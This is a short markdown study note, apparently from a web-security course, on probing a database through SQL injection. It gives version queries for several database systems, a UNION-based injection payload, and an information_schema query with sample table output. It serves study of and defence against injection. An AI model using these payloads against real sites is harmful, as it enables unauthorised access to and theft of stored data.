# Examining the database in SQL injection attacks

## Queries that determine db version 

|Database | Query|
|---------|-----|
|Microsoft, MySQL | `SELECT @@version`
|Oracle| `SELECT banner FROM v$version`|
|PostgreSQL | `SELECT version()`|

The version can be identified using a `UNION` attack.
```text
' UNION SELECT @@version
```

## Lisiting contents of the database

You can query `information_schema.tables` in database except Oracle to get details of the schema.
```sql
SELECT * FROM information_schema.tables
```

Returns:

|TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE|
|---------------|--------------|------------|-----------|
|MyDatabase|dbo|Products|BASE TABLE|
|MyDatabase|dbo|Users|BASE TABLE|
|MyDatabase|dbo|Feedback|BASE TABLE|